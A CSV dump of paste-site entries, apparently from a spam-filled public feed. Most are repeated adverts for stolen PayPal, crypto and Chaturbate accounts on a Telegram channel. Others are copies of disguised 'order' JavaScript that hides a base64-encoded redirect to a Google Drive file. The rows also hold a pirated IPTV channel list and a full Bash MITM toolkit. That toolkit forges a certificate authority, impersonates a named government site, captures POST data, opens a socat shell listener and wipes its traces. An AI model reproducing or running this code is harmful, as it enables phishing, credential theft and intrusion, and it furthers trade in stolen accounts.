id,title,username,language,date,content
zAHZCd3h,Leaked Accounts - Fresh Hits,kammex,JavaScript,Thursday 1st of May 2025 11:27:33 PM CDT,43358 Accounts Posted On https://t.me/leakzbyeminem
s60twVAw,Order.js,Ratqueenkslskskwkw,JavaScript,Thursday 1st of May 2025 11:27:31 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/13825/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hzAeG8US,USA,hantu08,JSON,Thursday 1st of May 2025 11:19:45 PM CDT,"{""provider"":{""epg"":[""https://epgshare01.online/epgshare01/epg_ripper_US1.xml.gz""],""refresh_minutes"":""15""},""categories"":{""15"":{""name"":""EXTRA CHANNEL"",""icon"":""https://w7.pngwing.com/pngs/130/1021/png-transparent-movie-logo-movie-logo-film-tape-cinema.png""}},""channels"":[{""category"":""15"",""epg_id"":""Cinemax.-.Eastern.HD.us"",""icon"":""https://download.logo.wine/logo/Cinemax/Cinemax-Logo.wine.png"",""name"":""Cinemax East"",""user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"",""drm_type"":""clearkey"",""drm_key"":"""",""url"":""https://v13.thetvapp.to/hls/CinemaxEast/tracks-v1a1/index.m3u8""},{""category"":""15"",""epg_id"":""Crime.and.Investigation.Network.USA.HD.us"",""icon"":""https://upload.wikimedia.org/wikipedia/commons/7/71/Crime_and_Investigation_logo.png"",""name"":""Crime & Investigation HD"",""user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"",""drm_type"":""clearkey"",""drm_key"":"""",""url"":""https://v17.thetvapp.to/hls/CrimePlusInvestigation/tracks-v1a1/index.m3u8""},{""category"":""15"",""epg_id"":""FX.Networks.East.Coast.us"",""icon"":""https://upload.wikimedia.org/wikipedia/commons/thumb/4/4d/FX_International_logo.svg/1525px-FX_International_logo.svg.png"",""name"":""FX Networks East "",""user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"",""drm_type"":""clearkey"",""drm_key"":"""",""url"":""https://v15.thetvapp.to/hls/FXEast/tracks-v1a1/index.m3u8""},{""category"":""15"",""epg_id"":""HBO.Comedy.HD.-.East.us"",""icon"":""https://upload.wikimedia.org/wikipedia/commons/8/84/HBO_Comedy_logo.png"",""name"":""HBO Comedy HD"",""user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"",""drm_type"":""clearkey"",""drm_key"":"""",""url"":""https://v1.thetvapp.to/hls/HBOComedyEast/tracks-v1a1/index.m3u8""},{""category"":""15"",""epg_id"":""HBO.Zone.HD.-.East.us"",""icon"":""https://upload.wikimedia.org/wikipedia/commons/6/6a/HBO_Zone_logo.png"",""name"":""HBO Zone HD"",""user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"",""drm_type"":""clearkey"",""drm_key"":"""",""url"":""https://v2.thetvapp.to/hls/HBOZoneEast/tracks-v1a1/index.m3u8""},{""category"":""15"",""epg_id"":""HBO.Signature.(HBO.3).-.Eastern.us"",""icon"":""https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/HBO_Signature.svg/1024px-HBO_Signature.svg.png"",""name"":""HBO Signature"",""user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"",""drm_type"":""clearkey"",""drm_key"":"""",""url"":""https://v8.thetvapp.to/hls/HBOSignatureEast/tracks-v1a1/index.m3u8""},{""category"":""15"",""epg_id"":""MovieMax.(Max.6).-.East.us"",""icon"":""https://upload.wikimedia.org/wikipedia/commons/thumb/5/52/MovieMax_Logo.svg/2560px-MovieMax_Logo.svg.png"",""name"":""MovieMAX"",""user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"",""drm_type"":""clearkey"",""drm_key"":"""",""url"":""https://v15.thetvapp.to/hls/MovieMaxEast/tracks-v1a1/index.m3u8""},{""category"":""15"",""epg_id"":""ION..-.Eastern.Feed.us"",""icon"":""https://upload.wikimedia.org/wikipedia/commons/8/8b/ION_Television.png"",""name"":""ION Television East HD"",""user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"",""drm_type"":""clearkey"",""drm_key"":"""",""url"":""https://v13.thetvapp.to/hls/IONTVEast/tracks-v1a1/index.m3u8""},{""category"":""15"",""epg_id"":""MoreMax..Eastern.us"",""icon"":""https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/MoreMax_Logo.svg/1024px-MoreMax_Logo.svg.png"",""name"":""MoreMAX"",""user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"",""drm_type"":""clearkey"",""drm_key"":"""",""url"":""https://v3.thetvapp.to/hls/MoreMaxEast/tracks-v1a1/index.m3u8""},{""category"":""15"",""epg_id"":""The.Movie.Channel.HDTV.(East).us"",""icon"":""https://upload.wikimedia.org/wikipedia/commons/thumb/4/4f/The_Movie_Channel.svg/1920px-The_Movie_Channel.svg.png"",""name"":""The Movie Channel East"",""user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"",""drm_type"":""clearkey"",""drm_key"":"""",""url"":""https://v5.thetvapp.to/hls/TheMovieChannelEast/tracks-v1a1/index.m3u8""},{""category"":""15"",""epg_id"":""Paramount+.with.Showtime.-.Eastern.Feed.us"",""icon"":""https://upload.wikimedia.org/wikipedia/commons/thumb/0/09/Paramount%2B_with_Showtime_logo.svg/1200px-Paramount%2B_with_Showtime_logo.svg.png"",""name"":""Showtime East"",""user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"",""drm_type"":""clearkey"",""drm_key"":"""",""url"":""https://v13.thetvapp.to/hls/ShowtimeEast/tracks-v1a1/index.m3u8""},{""category"":""15"",""epg_id"":""Paramount+.with.Showtime..West.us"",""icon"":""https://images.seeklogo.com/logo-png/12/1/showtime-west-logo-png_seeklogo-126033.png"",""name"":""SHOWTIME 2"",""user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"",""drm_type"":""clearkey"",""drm_key"":"""",""url"":""https://v17.thetvapp.to/hls/Showtime2East/tracks-v1a1/index.m3u8""},{""category"":""15"",""epg_id"":""Syfy.-.Eastern.Feed.us"",""icon"":""https://upload.wikimedia.org/wikipedia/commons/c/c9/Syfy.png"",""name"":""SYFY"",""user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"",""drm_type"":""clearkey"",""drm_key"":"""",""url"":""https://v1.thetvapp.to/hls/SyfyEast/tracks-v1a1/index.m3u8""},{""category"":""15"",""epg_id"":""FX.Movie.Channel.us"",""icon"":""https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/FX_Movies_logo.svg/2560px-FX_Movies_logo.svg.png"",""name"":""FX Movie"",""user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"",""drm_type"":""clearkey"",""drm_key"":"""",""url"":""https://v3.thetvapp.to/hls/FXMovieChannel/tracks-v1a1/index.m3u8""}]}"
w0vEXJmt,Chaturbate with Tokens,kammex,JavaScript,Thursday 1st of May 2025 11:12:11 PM CDT,42764 Accounts Posted On https://t.me/leakzbyeminem
e3xLNjWX,Market.js,Ratqueenkslskskwkw,JavaScript,Thursday 1st of May 2025 11:12:10 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/79850/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2KDse9ve,Crypto Accounts,kammex,JavaScript,Thursday 1st of May 2025 10:56:49 PM CDT,69105 Accounts Posted On https://t.me/leakzbyeminem
U1KDgYzN,Untitled,Ratqueenkslskskwkw,JavaScript,Thursday 1st of May 2025 10:56:48 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/17719/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Z4F0rDbp,PayPal with Balance,kammex,JavaScript,Thursday 1st of May 2025 10:41:27 PM CDT,61739 Accounts Posted On https://t.me/leakzbyeminem
TP8TFNtp,Products.js,Ratqueenkslskskwkw,JavaScript,Thursday 1st of May 2025 10:41:26 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/33293/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
0e2Yhqed,Leaked Accounts - Fresh Hits,kammex,JavaScript,Thursday 1st of May 2025 10:26:06 PM CDT,23034 Accounts Posted On https://t.me/leakzbyeminem
WxLU3Grk,Order.js,Ratqueenkslskskwkw,JavaScript,Thursday 1st of May 2025 10:26:05 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/68370/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
uuTuAAJF,Chaturbate with Tokens,kammex,JavaScript,Thursday 1st of May 2025 10:10:45 PM CDT,76952 Accounts Posted On https://t.me/leakzbyeminem
9sCDLip1,Market.js,Ratqueenkslskskwkw,JavaScript,Thursday 1st of May 2025 10:10:42 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/21388/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
VEzF53qy,GHOST TLS CONTROL MODULE,WhosYourDaddySec,Bash,Thursday 1st of May 2025 09:57:25 PM CDT,"#!/data/data/com.termux/files/usr/bin/bash

clear
echo
echo ""────────────────────────────────────────────────────────────────────────────""
echo ""                          GHOST TLS CONTROL MODULE""
echo ""────────────────────────────────────────────────────────────────────────────""
echo
echo ""An advanced, multi-vector TLS interception and emulation suite engineered for""
echo ""covert network exploitation, surveillance, and command deployment. This module""
echo ""leverages a forged Certificate Authority (CA) to hijack and impersonate secure""
echo ""HTTPS communications, enabling man-in-the-middle (MITM) attacks at scale.""
echo
echo ""Features:""
echo "" - Autonomous generation of persistent TLS tunnels using rogue certificates.""
echo "" - Real-time traffic logging for HTTP(S) GET and POST payload capture.""
echo "" - Seamless replication of live target websites for phishing and data siphoning.""
echo "" - Integrated reverse shell listener for persistent access via encrypted channels.""
echo "" - Full compatibility with offensive infrastructure, including exfiltration vectors.""
echo
echo ""Operational Security:""
echo "" - Self-wiping routines purge forensic traces, logs, and memory-resident processes.""
echo "" - No dependency on root privileges—designed for stealth operations in Termux.""
echo
echo ""WARNING: Deployment of this module against live infrastructure without explicit""
echo ""authorization constitutes a breach of international cybercrime statutes.""
echo
echo ""────────────────────────────────────────────────────────────────────────────""
echo

ROOT=""$HOME/.ghost_tls""
TARGET=""mossad.gov.il""
CN=""$TARGET""
MIRROR=""$ROOT/site_mirror""
LOG=""$ROOT/logs""
FIFO=""$ROOT/control""
PID_FILE=""$ROOT/pids.txt""

mkdir -p ""$ROOT/newcerts"" ""$MIRROR"" ""$LOG""
cd ""$ROOT"" || exit 1

touch index.txt
echo 1000 > serial

cat > openssl.conf <<EOF
[ ca ]
default_ca = CA_default
[ CA_default ]
dir = .
database = index.txt
new_certs_dir = ./newcerts
certificate = ./ca_cert.pem
serial = serial
private_key = ./ca_key.pem
default_days = 3650
default_md = sha256
policy = policy_loose
x509_extensions = v3_ca
[ policy_loose ]
commonName = supplied
[ req ]
default_bits = 4096
distinguished_name = req_distinguished_name
x509_extensions = v3_ca
string_mask = utf8only
default_md = sha256
prompt = no
[ req_distinguished_name ]
CN = GhostSec Root Authority
[ v3_ca ]
subjectKeyIdentifier = hash
authorityKeyIdentifier = keyid:always,issuer
basicConstraints = critical, CA:true
keyUsage = critical, digitalSignature, cRLSign, keyCertSign
extendedKeyUsage = serverAuth, clientAuth
[ v3_target_cert ]
authorityKeyIdentifier = keyid,issuer
basicConstraints = CA:FALSE
keyUsage = critical, digitalSignature, keyEncipherment
extendedKeyUsage = serverAuth, clientAuth
subjectAltName = @alt_names
[ alt_names ]
DNS.1 = $TARGET
DNS.2 = www.$TARGET
DNS.3 = *.$TARGET
EOF

openssl genpkey -algorithm RSA -out ca_key.pem -pkeyopt rsa_keygen_bits:4096
openssl req -x509 -new -key ca_key.pem -sha256 -days 3650 -out ca_cert.pem -config openssl.conf

openssl genpkey -algorithm RSA -out tls_key.pem -pkeyopt rsa_keygen_bits:2048

cat > csr.conf <<EOF
[ req ]
default_bits = 2048
prompt = no
default_md = sha256
distinguished_name = dn
req_extensions = v3_req
[ dn ]
CN = $CN
[ v3_req ]
keyUsage = critical, digitalSignature, keyEncipherment
extendedKeyUsage = serverAuth, clientAuth
subjectAltName = @alt_names
[ alt_names ]
DNS.1 = $TARGET
DNS.2 = www.$TARGET
DNS.3 = *.$TARGET
EOF

openssl req -new -key tls_key.pem -out target.csr -config csr.conf
openssl ca -batch -config openssl.conf -extensions v3_target_cert -days 825 -notext -in target.csr -out tls_cert.pem

wget --mirror --convert-links --adjust-extension --page-requisites --no-parent https://$TARGET -P ""$MIRROR""

cat > interceptor.py <<EOF
import ssl, http.server
class GhostHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        with open(""$LOG/log.txt"", ""a"") as f:
            f.write(""[GET] "" + self.path + ""\\n"")
            for k, v in self.headers.items(): f.write(f""{k}: {v}\\n"")
        self.send_response(200); self.end_headers(); self.wfile.write(b""GhostSec Proxy Active"")
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length).decode()
        with open(""$LOG/log.txt"", ""a"") as f:
            f.write(""[POST] "" + self.path + ""\\n"" + data + ""\\n"")
        self.send_response(200); self.end_headers(); self.wfile.write(b""POST Captured"")
httpd = http.server.HTTPServer(('0.0.0.0', 443), GhostHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, keyfile=""tls_key.pem"", certfile=""tls_cert.pem"", ca_certs=""ca_cert.pem"", server_side=True)
httpd.serve_forever()
EOF

cat > listener.sh <<EOF
#!/bin/bash
while true; do
  socat TCP-LISTEN:9001,reuseaddr,fork EXEC:/data/data/com.termux/files/usr/bin/bash
done
EOF

chmod +x listener.sh interceptor.py
nohup bash listener.sh > ""$LOG/pipe.log"" 2>&1 & echo $! >> ""$PID_FILE""
nohup python interceptor.py > ""$LOG/interceptor.log"" 2>&1 & echo $! >> ""$PID_FILE""

cat > cleanup.sh <<EOF
#!/data/data/com.termux/files/usr/bin/bash
echo ""Self-destruct sequence initiated...""
for pid in \$(cat ""$PID_FILE""); do
  kill -9 \$pid 2>/dev/null
done
rm -rf ""$ROOT""
echo ""Wipe complete. All modules and traces removed.""
EOF

chmod +x cleanup.sh

echo
echo ""Module active. To terminate and wipe all traces, run:""
echo ""bash $ROOT/cleanup.sh""
echo"
e92uNX1u,Crypto Accounts,kammex,JavaScript,Thursday 1st of May 2025 09:55:23 PM CDT,03032 Accounts Posted On https://t.me/leakzbyeminem
iMv2iYUT,PayPal with Balance,kammex,JavaScript,Thursday 1st of May 2025 09:40:02 PM CDT,49109 Accounts Posted On https://t.me/leakzbyeminem
WyWDxMsT,Products.js,Ratqueenkslskskwkw,JavaScript,Thursday 1st of May 2025 09:39:59 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/19092/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JMZb8B29,Leaked Accounts - Fresh Hits,kammex,JavaScript,Thursday 1st of May 2025 09:24:41 PM CDT,99821 Accounts Posted On https://t.me/leakzbyeminem
x8qPTj8e,Order.js,Ratqueenkslskskwkw,JavaScript,Thursday 1st of May 2025 09:24:37 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/68685/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Q3VCw9bj,Chaturbate with Tokens,kammex,JavaScript,Thursday 1st of May 2025 09:09:19 PM CDT,99197 Accounts Posted On https://t.me/leakzbyeminem
6Eh90MqA,Market.js,Ratqueenkslskskwkw,JavaScript,Thursday 1st of May 2025 09:09:15 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/02056/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
CDFc533K,Crypto Accounts,kammex,JavaScript,Thursday 1st of May 2025 08:53:57 PM CDT,28630 Accounts Posted On https://t.me/leakzbyeminem
0L0XmRWm,Untitled,Ratqueenkslskskwkw,JavaScript,Thursday 1st of May 2025 08:53:54 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/57464/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iqk6Pywf,PayPal with Balance,kammex,JavaScript,Thursday 1st of May 2025 08:38:36 PM CDT,38793 Accounts Posted On https://t.me/leakzbyeminem
